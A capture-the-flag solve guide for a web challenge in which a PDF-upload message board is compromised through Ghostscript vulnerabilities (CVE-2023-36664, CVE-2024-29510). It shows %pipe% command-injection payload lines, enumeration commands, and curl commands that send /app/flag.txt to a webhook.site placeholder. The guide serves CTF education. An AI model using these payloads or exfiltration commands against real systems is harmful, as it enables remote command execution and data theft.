# Solve.md

# [Medium] Web - Ghostly Message Board - Solve Guide

## Overview

Ghostly Message Board is a medium-difficulty web challenge involving a simple Flask message board application.

The application allows users to create forum-style posts and upload PDF files. Uploaded PDFs are processed server-side, with Ghostscript being used to generate output such as PDF thumbnails or previews.

The vulnerable Ghostscript behaviour can be abused to achieve remote command execution. Once command execution is obtained, the player can enumerate the container and read the flag from:

```text
/app/flag.txt
```

## Initial Analysis

Opening the site shows a message board with several forum-style topics, including areas such as:

```text
- Gardening
- DIY
- Home repair
```

Creating a topic or post allows the user to upload a file. The intended upload type is a PDF file.

After upload, the PDF is viewable in the browser and the application attempts to generate a thumbnail or preview of the file. This behaviour suggests that the application is processing the PDF server-side.

The challenge name, `Ghostly Message Board`, is a clue towards Ghostscript. Ghostscript is commonly used to process PDF and PostScript files, including generating previews or thumbnails.

At the time of the event, recent Ghostscript vulnerabilities were relevant, including:

```text
CVE-2023-36664
CVE-2024-29510
```

Researching Ghostscript PDF processing vulnerabilities shows that these issues can be chained to escape the intended sandbox and achieve command execution.

## Enumeration / Inspection

The key points to identify are:

```text
- The application accepts PDF uploads.
- Uploaded PDFs are processed server-side.
- A thumbnail or preview is generated.
- The challenge name hints at Ghostscript.
- Ghostscript has known command execution vulnerabilities.
```

Useful checks include:

```text
- Uploading a normal PDF and observing the application behaviour.
- Checking whether the PDF is rendered or previewed.
- Looking for signs of thumbnail generation.
- Reviewing error messages if malformed PDFs are uploaded.
- Researching Ghostscript PDF processing vulnerabilities.
```

The supplied source code can also be reviewed if needed, but during the event players were expected to attempt black-box analysis first.

## Method

The intended method is:

1. Identify that uploaded PDFs are processed by Ghostscript.
2. Research relevant Ghostscript vulnerabilities.
3. Use a public proof of concept for the vulnerable behaviour.
4. Modify the proof of concept to execute commands inside the container.
5. Enumerate the filesystem.
6. Locate `/app/flag.txt`.
7. Exfiltrate or print the flag.

The proof of concept referenced during solving used a Ghostscript payload containing a line similar to:

```text
plaintext (%pipe%gnome-calculator) (r) file
```

This can be modified to execute another command, for example:

```text
plaintext (%pipe%pwd) (r) file
```

Once command execution is confirmed, the payload can be adjusted to read or exfiltrate the flag.

## Exploitation / Decryption / Solution Steps

### Step 1: Open the web application

Navigate to the deployed challenge site.

The site presents a forum-style message board with several topic areas.

### Step 2: Identify the file upload functionality

Create a new topic or post and observe that the application allows a PDF file to be uploaded.

The uploaded PDF is then rendered or previewed by the application.

### Step 3: Infer PDF server-side processing

Because the application attempts to generate output from the uploaded PDF, such as a thumbnail or rendered preview, infer that the file is being processed server-side.

The challenge name also hints towards Ghostscript:

```text
Ghostly Message Board
```

### Step 4: Research Ghostscript vulnerabilities

Research Ghostscript vulnerabilities related to PDF or PostScript processing.

Relevant vulnerabilities include:

```text
CVE-2023-36664
CVE-2024-29510
```

A public proof of concept can be adapted from research discussing these vulnerabilities.

### Step 5: Modify the proof of concept

Take the proof of concept and replace the example command with a command useful for enumeration.

For example, change:

```text
plaintext (%pipe%gnome-calculator) (r) file
```

to:

```text
plaintext (%pipe%pwd) (r) file
```

This tests whether commands can be executed inside the application environment.

### Step 6: Enumerate the filesystem

Once command execution is confirmed, enumerate the container.

Useful commands include:

```bash
pwd
ls
ls -la
ls -la /app
whoami
id
```

The flag is located at:

```text
/app/flag.txt
```

### Step 7: Read or exfiltrate the flag

A command can be used to read the file directly:

```bash
cat /app/flag.txt
```

If the output is not returned in the application, exfiltrate the file using an outbound request.

One possible approach is to use `curl` with a webhook endpoint:

```bash
curl -X POST --data-binary @/app/flag.txt https://webhook.site/YOUR-WEBHOOK-ID
```

Alternatively, if command substitution is required:

```bash
curl "https://webhook.site/YOUR-WEBHOOK-ID?flag=$(cat /app/flag.txt)"
```

The flag is then visible in the webhook request.

## Commands Used

Basic enumeration commands:

```bash
pwd
ls
ls -la
ls -la /app
whoami
id
```

Read the flag:

```bash
cat /app/flag.txt
```

Exfiltrate the flag using `curl`:

```bash
curl -X POST --data-binary @/app/flag.txt https://webhook.site/YOUR-WEBHOOK-ID
```

Alternative exfiltration format:

```bash
curl "https://webhook.site/YOUR-WEBHOOK-ID?flag=$(cat /app/flag.txt)"
```

Example Ghostscript proof-of-concept command line to modify:

```text
plaintext (%pipe%pwd) (r) file
```

## Scripts Used

No custom script is strictly required.

A Ghostscript proof of concept for CVE-2023-36664 and CVE-2024-29510 was adapted by replacing the example command with enumeration and exfiltration commands.

Example command changes:

```text
Original example:
plaintext (%pipe%gnome-calculator) (r) file

Command execution test:
plaintext (%pipe%pwd) (r) file

Directory enumeration:
plaintext (%pipe%ls -la /app) (r) file

Flag read:
plaintext (%pipe%cat /app/flag.txt) (r) file

Flag exfiltration:
plaintext (%pipe%curl -X POST --data-binary @/app/flag.txt https://webhook.site/YOUR-WEBHOOK-ID) (r) file